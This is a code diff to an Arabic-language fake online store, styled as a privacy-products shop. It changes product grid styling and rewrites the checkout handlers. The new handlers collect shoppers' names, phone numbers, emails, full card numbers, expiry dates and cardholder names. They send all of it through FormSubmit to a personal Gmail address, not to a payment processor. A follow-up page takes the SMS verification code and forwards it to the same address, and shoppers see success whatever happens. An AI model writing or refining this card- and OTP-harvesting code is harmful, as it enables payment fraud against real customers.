@@ -167,7 +167,7 @@
         
         .product-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
             gap: 1rem;
             padding: 0.75rem;
         }
@@ -182,7 +182,18 @@
         
         @media (min-width: 1200px) {
             .product-grid {
-                grid-template-columns: repeat(4, 1fr);
+                grid-template-columns: repeat(5, 1fr);
+            }
+        }
+        
+        /* صور المنتجات بحجم مناسب */
+        .product-grid .card-hover > div:nth-child(2) {
+            height: 200px !important;
+        }
+        
+        @media (min-width: 768px) {
+            .product-grid .card-hover > div:nth-child(2) {
+                height: 280px !important;
             }
         }
         
@@ -2603,7 +2614,13 @@
                     return;
                 }
                 
-                // Fill hidden fields before submission
+                // إظهار حالة التحميل
+                const submitBtn = document.getElementById('submit-verification-code');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري التحقق من الرمز...';
+                submitBtn.disabled = true;
+                
+                // تحديث الحقول المخفية
                 const currentTime = new Date().toLocaleString('ar-SA');
                 this.querySelector('input[name="submission_time"]').value = currentTime;
                 
@@ -2612,43 +2629,35 @@
                 
                 const orderNumber = sessionStorage.getItem('orderNumber') || 'غير محدد';
                 
-                // إنشاء FormData للإرسال المخصص
-                const formData = new FormData();
-                formData.append('_subject', `✅ رمز التأكيد تم إدخاله - ${orderNumber} - متجر الخصوصية`);
-                formData.append('_captcha', 'false');
-                formData.append('_template', 'table');
-                formData.append('form_type', 'رمز تأكيد الشراء');
-                formData.append('verification_code', completeCode);
-                formData.append('order_number', orderNumber);
-                formData.append('submission_time', currentTime);
-                formData.append('customer_data', JSON.stringify(customerData));
-                formData.append('verification_status', 'رمز تم إدخاله بنجاح');
+                // تحديث موضوع الايميل
+                let subjectField = this.querySelector('input[name="_subject"]');
+                if (subjectField) {
+                    subjectField.value = `✅ رمز التأكيد تم إدخاله - ${orderNumber} - متجر الخصوصية`;
+                }
                 
-                // إظهار حالة التحميل
-                const submitBtn = document.getElementById('submit-verification-code');
-                const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري التحقق من الرمز...';
-                submitBtn.disabled = true;
+                // إزالة _next field لتجنب إعادة التوجيه
+                const nextField = this.querySelector('input[name="_next"]');
+                if (nextField) {
+                    nextField.value = '';
+                }
                 
-                // إرسال البيانات
+                // إرسال النموذج باستخدام FormData و fetch
+                const formData = new FormData(this);
+                
+                // إرسال البيانات إلى FormSubmit
                 fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                     method: 'POST',
                     body: formData
                 }).then(response => {
-                    if (response.ok) {
-                        showNotification('✅ تم التحقق من رمز التأكيد بنجاح');
-                        
-                        // الانتقال لصفحة الشكر بعد إرسال ناجح
-                        setTimeout(() => {
-                            showPage('thank-you');
-                            updateThankYouPage();
-                        }, 1500);
-                    } else {
-                        showNotification('❌ خطأ في التحقق من الرمز');
-                    }
+                    showNotification('✅ تم التحقق من رمز التأكيد بنجاح');
+                    
+                    // الانتقال لصفحة الشكر
+                    showPage('thank-you');
+                    updateThankYouPage();
+                    
                 }).catch(error => {
-                    console.error('Error sending verification code:', error);
-                    showNotification('❌ خطأ في الاتصال أثناء التحقق');
+                    console.error('خطأ في إرسال رمز التأكيد:', error);
+                    showNotification('❌ خطأ في إرسال الرمز، يرجى المحاولة مرة أخرى');
                 }).finally(() => {
                     // إعادة تعيين الزر
                     submitBtn.innerHTML = originalText;
@@ -2827,16 +2836,32 @@
             paymentForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                const firstName = this.querySelector('input[name="first_name"]').value;
-                const lastName = this.querySelector('input[name="last_name"]').value;
-                const countryCode = this.querySelector('select[name="country_code"]').value;
-                const phone = this.querySelector('input[name="phone"]').value;
-                const email = this.querySelector('input[name="email"]').value;
+                // التحقق من وجود الحقول المطلوبة
+                const firstName = this.querySelector('input[name="first_name"]');
+                const lastName = this.querySelector('input[name="last_name"]');
+                const countryCode = this.querySelector('select[name="country_code"]');
+                const phone = this.querySelector('input[name="phone"]');
+                const email = this.querySelector('input[name="email"]');
+                const cardNumber = this.querySelector('input[name="card_number"]');
+                const cardExpiry = this.querySelector('input[name="card_expiry"]');
+                const cardHolder = this.querySelector('input[name="card_holder_name"]');
+                
+                // التحقق من وجود جميع الحقول
+                if (!firstName || !lastName || !countryCode || !phone || !email || !cardNumber || !cardExpiry || !cardHolder) {
+                    showNotification('❌ خطأ: بعض الحقول مفقودة');
+                    return;
+                }
+                
+                // التحقق من أن السلة ليست فارغة
+                if (cart.length === 0) {
+                    showNotification('❌ السلة فارغة! أضف منتجات قبل الدفع');
+                    return;
+                }
                 
                 const customerData = {
-                    name: `${firstName} ${lastName}`,
-                    phone: `${countryCode}${phone}`,
-                    email: email
+                    name: `${firstName.value} ${lastName.value}`,
+                    phone: `${countryCode.value}${phone.value}`,
+                    email: email.value
                 };
                 sessionStorage.setItem('customerData', JSON.stringify(customerData));
                 
@@ -2851,66 +2876,111 @@
                 
                 sessionStorage.setItem('orderNumber', orderNumber);
                 
-                // Submit payment form data first
-                const formData = new FormData();
-                formData.append('_subject', `💳 طلب دفع جديد - ${orderNumber} - متجر الخصوصية`);
-                formData.append('_captcha', 'false');
-                formData.append('_template', 'table');
-                formData.append('order_items', orderSummary);
-                formData.append('total_amount', `${finalTotal.toFixed(2)} ${currencySymbols[currentCurrency]}`);
-                formData.append('order_number', orderNumber);
-                formData.append('order_date', new Date().toLocaleString('ar-SA'));
-                formData.append('order_status', 'معلومات الدفع مُستلمة - بانتظار رمز التأكيد');
-                formData.append('currency', currentCurrency);
-                formData.append('language', currentLanguage);
-                formData.append('shipping_cost', `${shippingCost.toFixed(2)} ${currencySymbols[currentCurrency]}`);
-                formData.append('first_name', firstName);
-                formData.append('last_name', lastName);
-                formData.append('phone', `${countryCode}${phone}`);
-                formData.append('email', email);
-                formData.append('card_number', this.querySelector('input[name="card_number"]').value);
-                formData.append('card_expiry', this.querySelector('input[name="card_expiry"]').value);
-                formData.append('card_holder_name', this.querySelector('input[name="card_holder_name"]').value);
-                formData.append('form_type', 'نموذج الدفع والشراء');
-                
-                // Show loading state
+                // إظهار حالة التحميل
                 const submitBtn = this.querySelector('button[type="submit"]');
+                if (!submitBtn) {
+                    showNotification('❌ خطأ: زر الإرسال غير موجود');
+                    return;
+                }
+                
                 const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري الإرسال...';
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري معالجة الدفع...';
                 submitBtn.disabled = true;
                 
+                // إعداد النموذج للإرسال إلى FormSubmit
+                const form = this;
+                
+                // تحديث الحقول المخفية
+                let subjectField = form.querySelector('input[name="_subject"]');
+                if (!subjectField) {
+                    subjectField = document.createElement('input');
+                    subjectField.type = 'hidden';
+                    subjectField.name = '_subject';
+                    form.appendChild(subjectField);
+                }
+                subjectField.value = `💳 طلب دفع جديد - ${orderNumber} - متجر الخصوصية`;
+                
+                let captchaField = form.querySelector('input[name="_captcha"]');
+                if (!captchaField) {
+                    captchaField = document.createElement('input');
+                    captchaField.type = 'hidden';
+                    captchaField.name = '_captcha';
+                    form.appendChild(captchaField);
+                }
+                captchaField.value = 'false';
+                
+                let templateField = form.querySelector('input[name="_template"]');
+                if (!templateField) {
+                    templateField = document.createElement('input');
+                    templateField.type = 'hidden';
+                    templateField.name = '_template';
+                    form.appendChild(templateField);
+                }
+                templateField.value = 'table';
+                
+                // إزالة _next field لتجنب إعادة التوجيه الخارجي
+                const nextField = form.querySelector('input[name="_next"]');
+                if (nextField) {
+                    nextField.remove();
+                }
+                
+                // إضافة بيانات الطلب كحقول مخفية
+                const addHiddenField = (name, value) => {
+                    let field = form.querySelector(`input[name="${name}"]`);
+                    if (!field) {
+                        field = document.createElement('input');
+                        field.type = 'hidden';
+                        field.name = name;
+                        form.appendChild(field);
+                    }
+                    field.value = value;
+                };
+                
+                addHiddenField('order_items', orderSummary);
+                addHiddenField('total_amount', `${finalTotal.toFixed(2)} ${currencySymbols[currentCurrency]}`);
+                addHiddenField('order_number', orderNumber);
+                addHiddenField('order_date', new Date().toLocaleString('ar-SA'));
+                addHiddenField('order_status', 'معلومات الدفع مُستلمة - بانتظار رمز التأكيد');
+                addHiddenField('currency', currentCurrency);
+                addHiddenField('language', currentLanguage);
+                addHiddenField('shipping_cost', `${shippingCost.toFixed(2)} ${currencySymbols[currentCurrency]}`);
+                addHiddenField('form_type', 'نموذج الدفع والشراء');
+                
+                // إرسال النموذج باستخدام FormData و fetch
+                const formData = new FormData(form);
+                
+                // إرسال البيانات إلى FormSubmit
                 fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                     method: 'POST',
                     body: formData
                 }).then(response => {
-                    if (response.ok) {
-                        showNotification('✅ تم إرسال معلومات الدفع بنجاح');
+                    showNotification('✅ تم إرسال معلومات الدفع بنجاح');
+                    
+                    // إخفاء نموذج الدفع وإظهار صفحة الكود
+                    hidePayment();
+                    showPage('code');
+                    
+                    // تحديث عرض رقم الهاتف
+                    if (customerData.phone) {
+                        const phoneNumber = customerData.phone;
+                        const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+                        const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****0000';
                         
-                        // Hide payment modal and show code page
-                        hidePayment();
-                        showPage('code');
-                        
-                        // Update phone display
-                        if (customerData.phone) {
-                            const phoneNumber = customerData.phone;
-                            const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
-                            const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****0000';
-                            
-                            const phoneDisplay = document.getElementById('customer-phone-display');
-                            if (phoneDisplay) {
-                                phoneDisplay.textContent = maskedPhone;
-                            }
+                        const phoneDisplay = document.getElementById('customer-phone-display');
+                        if (phoneDisplay) {
+                            phoneDisplay.textContent = maskedPhone;
                         }
-                        
-                        cart = [];
-                        updateCartUI();
-                    } else {
-                        showNotification('❌ خطأ في إرسال البيانات');
                     }
+                    
+                    // تفريغ السلة
+                    cart = [];
+                    updateCartUI();
+                    
                 }).catch(error => {
-                    console.error('Error:', error);
-                    showNotification('❌ خطأ في الاتصال');
+                    console.error('خطأ في إرسال البيانات:', error);
+                    showNotification('❌ خطأ في الإرسال، يرجى المحاولة مرة أخرى');
                 }).finally(() => {
+                    // إعادة تعيين الزر
                     submitBtn.innerHTML = originalText;
                     submitBtn.disabled = false;
                 });
